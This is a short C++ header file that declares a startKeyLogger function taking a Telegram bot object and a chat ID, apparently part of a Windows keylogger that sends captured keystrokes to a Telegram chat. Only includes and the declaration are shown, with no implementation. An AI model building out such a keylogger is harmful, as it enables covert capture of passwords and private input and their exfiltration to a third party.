#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <fstream>
#include <unordered_map>
#include <thread>
#include <chrono>
#include <windows.h>
#include "tgbot/tgbot.h"
#include "globals.h"

void startKeyLogger(TgBot::Bot& bot, int64_t chatId);

#endif